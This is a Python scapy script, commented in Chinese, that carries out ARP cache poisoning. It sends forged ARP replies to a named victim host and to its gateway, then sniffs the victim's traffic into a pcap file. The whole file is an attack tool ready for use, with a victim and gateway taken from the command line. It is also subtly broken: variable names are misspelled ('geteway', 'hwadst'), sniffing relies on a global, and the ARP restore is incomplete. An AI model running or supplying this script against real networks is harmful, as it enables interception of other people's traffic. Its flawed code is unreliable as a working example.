from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim    # 受害者
        self.victimmac = get_mac(victim)    # mac受害者
        self.geteway = geteway  # 网关
        self.getewaymac = get_mac(geteway) # mac网关
        self.interface = interface  # 界面
        conf.iface = interface
        conf.verb = 0   # en0默认 ifconif en0

        print(f'Initialized {interface}:')
        print(f'Geteway ({geteway}) is at {self.getewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print(f'-' * 30)

    def run(self):
        # 毒害ARP缓冲
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # 嗅探网络流量，实时监控攻击过程
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
    
    def poison(self):
        # 构建攻击受害者和网关的恶意数据

        # 构建毒害受害者的恶意ARP数据包
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.geteway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)

        # 构建毒害网关的恶意ARP数据包
        poison_geteway = ARP()
        poison_geteway.op = 2
        poison_geteway.psrc = self.victim
        poison_geteway.pdst = self.geteway
        poison_geteway.hwadst = self.getewaymac

        print(f'ip src: {poison_geteway.psrc}')
        print(f'ip dst: {poison_geteway.pdst}')
        print(f'mac dst: {poison_geteway.hwdst}')
        print(f'mac src: {poison_geteway.hwsrc}')
        print(poison_geteway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')


        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_geteway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        # 嗅探前休眠5秒
        time.sleep(5)
        print(f'Sniffing {count} packets')
        # 嗅探受害者的IP地址数据包
        bpf_filter = "ip host %s" % victim
        # 仅嗅探指定的个数（默认为100个）
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # 嗅探完成这些数据后，sniff函数将他们存进一个名为arper.pcap的文件中
        wrpcap('arpre.pcap', packets)
        print("Got the packets")
        # 将ARP表中的数据还原为原来的值
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")
    
    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op = 2,
            psrc = self.geteway,
            hwsrc = self.getewaymac,
            pdst = self.victim,
            hwdst = 'ff:ff:ff:ff:ff:ff'),
            count = 5
        )

if __name__ == "__main__":
    (victim, geteway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, geteway, interface)
    myarp.run()
